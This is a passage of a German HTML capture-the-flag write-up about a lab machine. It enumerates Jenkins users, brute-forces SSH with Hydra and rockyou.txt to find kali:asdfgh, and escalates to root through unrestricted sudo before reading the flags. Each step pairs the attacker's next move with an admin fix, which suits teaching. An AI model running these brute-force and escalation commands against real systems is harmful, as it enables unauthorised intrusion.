+http://que.hmv:8080/asynchPeople         (Status: 302) [Size: 0] [-> http://que.hmv:8080/asynchPeople/]
+
+http://que.hmv:8080/asynchPeople/</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Notiz des Pentesters, die den zuvor von Metasploit gefundenen Pfad `/asynchPeople/` und dessen Weiterleitung (Status 302) von der Variante ohne abschließenden Schrägstrich hervorhebt.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt den korrekten Pfad für den Zugriff auf die Benutzerliste.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Rufen Sie `http://que.hmv:8080/asynchPeople/` im Browser auf, um die Benutzerliste zu sehen.<br>**Empfehlung (Admin):** Zugriff auf `/asynchPeople/` beschränken.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Skip to content
+[Jenkins]Jenkins
+Anmelden
+
+    Dashboard
+    Benutzer
+
+Benutzer
+Build-Verlauf
+Zugangsdaten
+Build-Warteschlange
+Keine Builds geplant
+Build-Prozessor-Status
+1	Ruhend
+2	Ruhend
+Benutzer
+
+Beinhaltet alle bekannten Benutzer, einschließlich der Login-Benutzer des aktuellen Sicherheitsbereichs, sowie Namen, die in Commit-Kommentaren von Changelogs erwähnt werden.
+	Jenkins Benutzer Id	Name	Letzte SCM-Aktivität  ↑	Job
+<span class="command">an0ma1</span>	<span class="command">Mike</span>	N/A
+Symbol:
+
+    Small
+    Medium
+    Large
+
+REST API</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dies scheint der Inhalt oder eine Beschreibung der Seite zu sein, die unter `/asynchPeople/` (oder `/people/`) zugänglich ist. Sie listet Jenkins-Benutzer auf.</p>
+            <p class="evaluation">**Bewertung:** Die Seite listet mindestens einen Benutzer auf: Jenkins Benutzer-ID `an0ma1` mit dem Namen `Mike`. Dies gibt einen weiteren potenziellen Benutzernamen (`an0ma1` oder `mike`).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie `an0ma1` und `mike` zur Liste der Benutzernamen für Brute-Force-Versuche hinzu, insbesondere gegen SSH, da der Jenkins-Login wahrscheinlich mit `admin:admin` funktioniert.<br>**Empfehlung (Admin):** Zugriff auf diese Seite beschränken.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l mike -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.122:22 -t 64</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.122:22 -t 64</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.122:22 -t 64</span></div>
+                    <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-09 22:36:56
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344498 login tries (l:1/p:14344498), ~224133 tries per task
+[DATA] attacking ssh://192.168.2.122:22/
+[STATUS] 333.00 tries/min, 333 tries in 00:01h, 14344203 to do in 717:56h, 26 active
+
+<span class="password">[22][ssh] host: 192.168.2.122   login: kali   password: asdfgh</span>
+
+<span class="password">1 of 1 target successfully completed, 1 valid password found</span>
+[WARNING] Writing restore file because 9 final worker threads did not complete until end.
+[ERROR] 9 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-09 22:38:52</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Hydra wird verwendet, um einen Brute-Force-Angriff gegen den SSH-Dienst auf Port 22 durchzuführen.
+*   Der erste Versuch zielt auf den Benutzer `mike` (gefunden auf der Jenkins-Benutzerseite).
+*   Die nächsten beiden (identischen) Versuche zielen auf den Benutzer `kali`. Es ist unklar, warum `kali` versucht wird, möglicherweise ein Standardversuch oder ein Hinweis aus einer anderen Quelle.
+*   `-P /usr/share/wordlists/rockyou.txt`: Verwendet die RockYou-Passwortliste.
+*   `-t 64`: Hohe Anzahl an Threads (Hydra warnt erneut davor).</p>
+            <p class="evaluation">**Bewertung:** Der Angriff auf den Benutzer `kali` ist erfolgreich! Hydra findet das Passwort `asdfgh`. Dies ist ein extrem schwaches Passwort und ein häufiger Standard oder Test-Account-Name. Der Versuch für `mike` war (implizit) nicht erfolgreich.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die gefundenen Zugangsdaten (`kali`:`asdfgh`), um sich per SSH am Zielsystem anzumelden.<br>**Empfehlung (Admin):** Deaktivieren Sie den Benutzer `kali` oder ändern Sie sofort das Passwort in ein starkes, einzigartiges Passwort. Verbieten Sie schwache Passwörter systemweit. Deaktivieren Sie die Passwort-Authentifizierung für SSH zugunsten von Schlüsselpaaren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh kali@192.168.2.122</span></div>
+                    <pre>The authenticity of host '192.168.2.122 (192.168.2.122)' can't be established.
+ED25519 key fingerprint is SHA256:bRVZrq9ie993SEaYacnzsBuReGUn0QGl5cqJCuoLJ4w.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added '192.168.2.122' (ED25519) to the list of known hosts.
+kali@192.168.2.122's password: <span class="password">********</span>
+Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu May  9 08:38:52 PM UTC 2024
+
+  System load:                      0.42919921875
+  Usage of /:                       57.7% of 11.21GB
+  Memory usage:                     39%
+  Swap usage:                       0%
+  Processes:                        164
+  Users logged in:                  0
+  IPv4 address for br-d393e9ef9b30: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for enp0s3:          192.168.2.122
+  IPv6 address for enp0s3:          2003:d4:c71d:9f62:a00:27ff:fe23:4e2d
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+425 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sat Apr 13 02:41:03 2024
+<span class="prompt">kali@asd:~$</span> </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Versuch, sich per SSH mit den zuvor durch Hydra gefundenen Zugangsdaten (`kali`:`asdfgh`) am Zielsystem anzumelden.</p>
+            <p class="evaluation">**Bewertung:** Der Login ist erfolgreich! Nach Bestätigung des Host-Schlüssels und Eingabe des Passworts `asdfgh` erhält der Angreifer eine interaktive Shell als Benutzer `kali` auf dem Zielsystem (Hostname `asd`). Der initiale Zugriff ist somit erfolgt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Der erste Schritt nach dem Login ist die lokale Enumeration zur Privilegieneskalation. Führen Sie `sudo -l` aus, um zu prüfen, welche Befehle `kali` mit Root-Rechten ausführen darf.<br>**Empfehlung (Admin):** SSH-Zugriff mit schwachen Passwörtern ist ein hohes Risiko. Sofort das Passwort ändern oder den Account deaktivieren. Passwort-Authentifizierung für SSH deaktivieren.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="comment">**Kurzbeschreibung:** Nach dem initialen Zugriff als Benutzer 'kali' wird überprüft, welche Sudo-Rechte dieser Benutzer hat. Es stellt sich heraus, dass 'kali' alle Befehle als jeder Benutzer ausführen darf, was eine direkte Privilegieneskalation zu Root ermöglicht.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">kali@asd:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+[sudo] password for kali: <span class="password">********</span>
+Matching Defaults entries for kali on asd:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User kali may run the following commands on asd:
+    <span class="password">(ALL : ALL) ALL</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Innerhalb der SSH-Sitzung als Benutzer `kali` wird der Befehl `sudo -l` ausgeführt. Dieser Befehl listet die Sudo-Berechtigungen für den aktuellen Benutzer auf, nachdem das Passwort des Benutzers (`asdfgh`) eingegeben wurde.</p>
+            <p class="evaluation">**Bewertung:** Dies ist der entscheidende Schritt zur Privilegieneskalation. Die Ausgabe `(ALL : ALL) ALL` bedeutet, dass der Benutzer `kali` **jeden** Befehl (`ALL`) als **jeder** Benutzer (`ALL`) auf **jedem** Host (`ALL`) ausführen darf. Der Benutzer `kali` hat volle Sudo-Rechte.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die vollen Sudo-Rechte, um eine Root-Shell zu erhalten. Der einfachste Weg ist `sudo su` oder `sudo -i`.<br>**Empfehlung (Admin):** **Kritische Fehlkonfiguration!** Ein normaler Benutzer sollte niemals `(ALL : ALL) ALL`-Rechte haben. Überprüfen Sie die Sudoers-Datei (`/etc/sudoers` oder Dateien in `/etc/sudoers.d/`) und entziehen Sie dem Benutzer `kali` diese übermäßigen Rechte sofort. Weisen Sie Rechte nach dem Least-Privilege-Prinzip zu.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">kali@asd:~$ <span class="command">sudo su</span></div>
+                    <div class="prompt">root@asd:/home/kali# <span class="command">id</span></div>
+                    <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                    <div class="prompt">root@asd:/home/kali# </div>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `sudo su` wird ausgeführt. Da `kali` volle Sudo-Rechte hat, wird ohne weitere Passwortabfrage eine Shell als Root-Benutzer gestartet. Der Prompt wechselt zu `root@asd:...#`. Der `id`-Befehl bestätigt die Identität als Root.</p>
+            <p class="evaluation">**Bewertung:** Privilegieneskalation erfolgreich abgeschlossen. Der Angreifer hat nun vollständige Kontrolle über das System als Root-Benutzer.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das Ziel ist erreicht. Suchen Sie nach den Flag-Dateien (`user.txt`, `root.txt`).<br>**Empfehlung (Admin):** Beheben Sie die Sudo-Fehlkonfiguration.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@asd:/home/kali# <span class="command">id</span></div>
+                    <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                    <div class="prompt">root@asd:/home/kali# <span class="command">id</span></div>
+                    <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                    <div class="prompt">root@asd:/home/kali# <span class="command">cd ~</span></div>
+                    <div class="prompt">root@asd:~# <span class="command">ls</span></div> <span class="comment"><-- Prompt korrigiert zu root@asd:~#</span>
+                    <pre>root.txt  snap</pre>
+                    <div class="prompt">root@asd:~# <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">flag{Hackercommunicationgroup660930334iswaitingforyoutojoin_}</span></pre>
+                    <div class="prompt">root@asd:~# <span class="command">cd /home/penetration/</span></div>
+                    <div class="prompt">root@asd:/home/penetration# <span class="command">ls</span></div>
+                    <pre>note.txt  start.sh  user.txt</pre>
+                    <div class="prompt">root@asd:/home/penetration# <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">flag{Whynotjoinsomehackercommunicationgroups_}</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Als Root-Benutzer werden verschiedene Befehle ausgeführt, um die Flag-Dateien zu finden und anzuzeigen. `cd ~` wechselt ins Home-Verzeichnis des Root-Benutzers. `ls` listet den Inhalt auf, `root.txt` wird gefunden. `cat root.txt` zeigt den Inhalt der Root-Flag an. Anschließend wird ins Verzeichnis `/home/penetration/` gewechselt, der Inhalt aufgelistet (`user.txt` gefunden) und die User-Flag mit `cat user.txt` angezeigt.</p>
+             <p class="evaluation">**Bewertung:** Beide Flags wurden erfolgreich gefunden und ausgelesen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Dokumentieren Sie die gefundenen Flags. Der Test ist abgeschlossen.<br>**Empfehlung (Admin):** Die Flags selbst sind nur für CTF-Szenarien relevant. Wichtig sind die Behebung der Sudo-Fehlkonfiguration und der schwachen SSH-Zugangsdaten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>Privilege Escalation erfolgreich</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Bestätigende Notiz des Pentesters.</p>
+             <p class="evaluation">**Bewertung:** Korrekt.</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine Aktion erforderlich.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/penetration/user.txt</div>
+                    <div class="flag-value"><span class="password">flag{Whynotjoinsomehackercommunicationgroups_}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">flag{Hackercommunicationgroup660930334iswaitingforyoutojoin_}</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 9. Mai 2024</p> <!-- Datum extrahiert -->
+    </footer>
+</body>
+</html>
